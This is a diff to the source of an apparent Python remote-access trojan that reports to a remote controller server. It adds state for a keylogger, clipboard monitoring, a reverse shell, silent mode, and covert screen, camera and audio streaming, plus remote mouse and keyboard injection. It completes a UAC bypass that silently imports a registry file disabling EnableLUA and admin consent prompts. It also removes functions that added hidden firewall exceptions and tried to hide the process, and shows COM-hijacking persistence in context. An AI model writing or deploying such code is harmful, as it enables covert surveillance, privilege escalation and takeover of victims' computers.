@@ -290,6 +290,82 @@ except ImportError:
 
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
 
+# Global state variables
+STREAMING_ENABLED = False
+STREAM_THREADS = []
+STREAM_THREAD = None
+capture_queue = None
+encode_queue = None
+TARGET_FPS = 15
+CAPTURE_QUEUE_SIZE = 5
+ENCODE_QUEUE_SIZE = 5
+
+# Audio streaming variables
+AUDIO_STREAMING_ENABLED = False
+AUDIO_STREAM_THREADS = []
+AUDIO_STREAM_THREAD = None
+audio_capture_queue = None
+audio_encode_queue = None
+AUDIO_CAPTURE_QUEUE_SIZE = 10
+AUDIO_ENCODE_QUEUE_SIZE = 10
+TARGET_AUDIO_FPS = 44.1
+
+# Camera streaming variables
+CAMERA_STREAMING_ENABLED = False
+CAMERA_STREAM_THREADS = []
+camera_capture_queue = None
+camera_encode_queue = None
+CAMERA_CAPTURE_QUEUE_SIZE = 5
+CAMERA_ENCODE_QUEUE_SIZE = 5
+TARGET_CAMERA_FPS = 30
+
+# Other global variables
+CLIPBOARD_MONITOR_ENABLED = False
+CLIPBOARD_MONITOR_THREAD = None
+CLIPBOARD_BUFFER = []
+LAST_CLIPBOARD_CONTENT = ""
+
+KEYLOGGER_ENABLED = False
+KEYLOGGER_THREAD = None
+KEYLOG_BUFFER = []
+
+VOICE_CONTROL_ENABLED = False
+VOICE_CONTROL_THREAD = None
+VOICE_RECOGNIZER = None
+
+REVERSE_SHELL_ENABLED = False
+REVERSE_SHELL_THREAD = None
+REVERSE_SHELL_SOCKET = None
+
+REMOTE_CONTROL_ENABLED = False
+LOW_LATENCY_INPUT_HANDLER = None
+
+# System state
+SILENT_MODE = False
+DEBUG_MODE = False
+DEPLOYMENT_COMPLETED = False
+
+# Additional global variables
+DASHBOARD_HTML = None
+controller_app = None
+controller_socketio = None
+controller_thread = None
+connected_agents = {}
+agents_data = {}
+operators = set()
+background_initializer = None
+high_performance_capture = None
+low_latency_input = None
+mouse_controller = None
+keyboard_controller = None
+low_latency_available = False
+
+# Clipboard and monitoring
+CHUNK = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+
 def check_system_requirements():
     """
     Check system requirements and provide graceful fallbacks for missing dependencies
@@ -3106,93 +3182,7 @@ def setup_com_hijacking_persistence():
         log_message(f"COM hijacking persistence failed: {e}")
         return False
 
-def add_firewall_exception():
-    """Add firewall exception for the current process."""
-    if not WINDOWS_AVAILABLE:
-        return False
-    
-    try:
-        # Get the current executable path
-        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
-        
-        # Create a unique rule name
-        rule_name = f"Python Agent {uuid.uuid4()}"
-        
-        # Try multiple approaches for firewall exception
-        success = False
-        
-        # Method 1: Try with full path and proper escaping
-        try:
-            subprocess.run([
-                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-                f'name={rule_name}',
-                'dir=in', 'action=allow',
-                f'program={current_exe}'
-            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
-            success = True
-            log_message(f"[OK] Firewall exception added: {rule_name}")
-        except subprocess.CalledProcessError as e:
-            log_message(f"[WARN] Method 1 failed: {e}")
-        
-        # Method 2: Try with just python.exe if Method 1 failed
-        if not success:
-            try:
-                subprocess.run([
-                    'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-                    f'name={rule_name}',
-                    'dir=in', 'action=allow',
-                    'program=python.exe'
-                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
-                success = True
-                log_message(f"[OK] Firewall exception added (python.exe): {rule_name}")
-            except subprocess.CalledProcessError as e:
-                log_message(f"[WARN] Method 2 failed: {e}")
-        
-        # Method 3: Try with PowerShell if netsh fails
-        if not success:
-            try:
-                powershell_cmd = f'New-NetFirewallRule -DisplayName "{rule_name}" -Direction Inbound -Action Allow -Program "python.exe"'
-                subprocess.run([
-                    'powershell.exe', '-Command', powershell_cmd
-                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
-                success = True
-                log_message(f"[OK] Firewall exception added via PowerShell: {rule_name}")
-            except subprocess.CalledProcessError as e:
-                log_message(f"[WARN] Method 3 failed: {e}")
-        
-        if not success:
-            log_message("[WARN] All firewall exception methods failed. Continuing without firewall exception.", "warning")
-        
-        return success
-        
-    except Exception as e:
-        log_message(f"[ERROR] Failed to add firewall exception: {e}")
-        return False
-def hide_process():
-    """Attempt to hide the current process from task manager."""
-    if not WINDOWS_AVAILABLE:
-        return False
-    
-    try:
-        # Set process to run in background with low priority
-        if not PSUTIL_AVAILABLE:
-            return False
-            
-        process = psutil.Process()
-        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
-        
-        # Try to hide from process list (limited effectiveness)
-        try:
-            ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
-        except (AttributeError, OSError):
-            # ctypes.windll might not be available or the call might fail
-            pass
-        
-        return True
-        
-    except Exception as e:
-        log_message(f"Failed to hide process: {e}")
-        return False
+# Removed duplicate functions - these are already defined above
 
 def disable_uac():
     """Disable UAC (User Account Control) by modifying registry settings."""
@@ -3813,6 +3803,23 @@ def audio_send_worker(agent_id):
             time.sleep(0.01)
     
     log_message("Audio sending stopped")
+
+def stream_screen_h264_socketio(agent_id):
+    """Modern H.264 screen streaming with SocketIO."""
+    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
+    
+    if not STREAMING_ENABLED:
+        STREAMING_ENABLED = True
+        capture_queue = queue.Queue(maxsize=CAPTURE_QUEUE_SIZE)
+        encode_queue = queue.Queue(maxsize=ENCODE_QUEUE_SIZE)
+        STREAM_THREADS = [
+            threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
+            threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
+        ]
+        for t in STREAM_THREADS:
+            t.start()
+        log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")
 
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
@@ -5697,6 +5704,128 @@ class AdaptiveQualityManager:
         
         if new_quality != current_quality:
             self.capture.set_quality(new_quality)
+
+class LowLatencyInputHandler:
+    """High-performance input handler for remote control with minimal latency."""
+    
+    def __init__(self, max_queue_size=1000):
+        self.input_queue = queue.Queue(maxsize=max_queue_size)
+        self.running = False
+        self.thread = None
+        self.stats = {
+            'inputs_processed': 0,
+            'avg_latency': 0.0,
+            'total_latency': 0.0
+        }
+    
+    def start(self):
+        """Start the input handler thread."""
+        if not self.running:
+            self.running = True
+            self.thread = threading.Thread(target=self._input_worker, daemon=True)
+            self.thread.start()
+            log_message("Low latency input handler started")
+    
+    def stop(self):
+        """Stop the input handler thread."""
+        self.running = False
+        if self.thread:
+            self.thread.join(timeout=1.0)
+    
+    def handle_input(self, input_data):
+        """Queue input data for processing."""
+        try:
+            if not self.input_queue.full():
+                input_data['timestamp'] = time.time()
+                self.input_queue.put(input_data, block=False)
+                return True
+            else:
+                log_message("Input queue full, dropping input", "warning")
+                return False
+        except Exception as e:
+            log_message(f"Error queuing input: {e}")
+            return False
+    
+    def _input_worker(self):
+        """Worker thread that processes input commands."""
+        while self.running:
+            try:
+                try:
+                    input_data = self.input_queue.get(timeout=0.1)
+                except queue.Empty:
+                    continue
+                
+                start_time = time.time()
+                self._process_input(input_data)
+                
+                # Update latency stats
+                latency = time.time() - start_time
+                self.stats['total_latency'] += latency
+                self.stats['inputs_processed'] += 1
+                self.stats['avg_latency'] = self.stats['total_latency'] / self.stats['inputs_processed']
+                
+            except Exception as e:
+                log_message(f"Error in input worker: {e}")
+                time.sleep(0.001)  # Brief pause on error
+    
+    def _process_input(self, input_data):
+        """Process a single input command."""
+        try:
+            action = input_data.get('action')
+            data = input_data.get('data', {})
+            
+            if action == 'key_press':
+                self._handle_key_press(data)
+            elif action == 'mouse_move':
+                self._handle_mouse_move(data)
+            elif action == 'mouse_click':
+                self._handle_mouse_click(data)
+            else:
+                log_message(f"Unknown input action: {action}")
+                
+        except Exception as e:
+            log_message(f"Error processing input: {e}")
+    
+    def _handle_key_press(self, data):
+        """Handle key press input."""
+        if keyboard_controller:
+            key = data.get('key')
+            if key:
+                try:
+                    keyboard_controller.press(key)
+                    time.sleep(0.01)  # Brief press
+                    keyboard_controller.release(key)
+                except Exception as e:
+                    log_message(f"Error handling key press: {e}")
+    
+    def _handle_mouse_move(self, data):
+        """Handle mouse movement input."""
+        if mouse_controller:
+            x = data.get('x', 0)
+            y = data.get('y', 0)
+            try:
+                mouse_controller.position = (x, y)
+            except Exception as e:
+                log_message(f"Error handling mouse move: {e}")
+    
+    def _handle_mouse_click(self, data):
+        """Handle mouse click input."""
+        if mouse_controller:
+            button = data.get('button', 'left')
+            try:
+                if button == 'left':
+                    mouse_controller.click(button=button)
+                elif button == 'right':
+                    mouse_controller.click(button=button)
+                elif button == 'middle':
+                    mouse_controller.click(button=button)
+            except Exception as e:
+                log_message(f"Error handling mouse click: {e}")
+    
+    def get_stats(self):
+        """Get performance statistics."""
+        return self.stats.copy()
+
 # Fast serialization
 try:
     import msgpack
@@ -6850,8 +6979,8 @@ def on_mouse_click(data):
         log_message(f"Error simulating mouse click: {e}")
 
 @sio.on('key_press')
-def on_key_press(data):
-    """Handle simulated key presses."""
+def on_remote_key_press(data):
+    """Handle simulated key presses from remote controller."""
     key = data.get('key')
     event_type = data.get('event_type')
 
@@ -7408,31 +7537,7 @@ def screen_send_worker(agent_id):
             log_message(f"SocketIO send error: {e}", "error")
 
 
-def start_streaming(agent_id):
-    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
-    if not STREAMING_ENABLED:
-        STREAMING_ENABLED = True
-        capture_queue = queue.Queue(maxsize=CAPTURE_QUEUE_SIZE)
-        encode_queue = queue.Queue(maxsize=ENCODE_QUEUE_SIZE)
-        STREAM_THREADS = [
-            threading.Thread(target=screen_capture_worker, args=(agent_id,), daemon=True),
-            threading.Thread(target=screen_encode_worker, args=(agent_id,), daemon=True),
-            threading.Thread(target=screen_send_worker, args=(agent_id,), daemon=True),
-        ]
-        for t in STREAM_THREADS:
-            t.start()
-        log_message(f"Started modern non-blocking video stream at {TARGET_FPS} FPS.")
-
-def stop_streaming():
-    global STREAMING_ENABLED, STREAM_THREADS, capture_queue, encode_queue
-    if STREAMING_ENABLED:
-        STREAMING_ENABLED = False
-        for t in STREAM_THREADS:
-            t.join(timeout=2)
-        STREAM_THREADS = []
-        capture_queue = None
-        encode_queue = None
-        log_message("Stopped video stream.")
+# Removed duplicate functions - these are already defined above
 
 # Documented: Modern streaming pipeline uses three threads and two queues for capture, encode, and send. Each stage is non-blocking and drops oldest frames if overloaded. FPS and buffer sizes are configurable.
 
@@ -7445,4 +7550,31 @@ def write_and_import_uac_bypass_reg():
 Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
-@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v
+@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f && reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
+"DelegateExecute"=""
+'''
+    
+    # Write registry file
+    reg_file_path = os.path.join(tempfile.gettempdir(), "uac_bypass.reg")
+    with open(reg_file_path, 'w') as f:
+        f.write(reg_content)
+    
+    # Import registry file
+    try:
+        subprocess.run(['regedit.exe', '/s', reg_file_path], 
+                      creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
+        log_message("UAC bypass registry imported successfully")
+        
+        # Clean up
+        try:
+            os.remove(reg_file_path)
+        except:
+            pass
+            
+        return True
+        
+    except Exception as e:
+        log_message(f"Failed to import UAC bypass registry: {e}")
+        return False
+
+# End of file
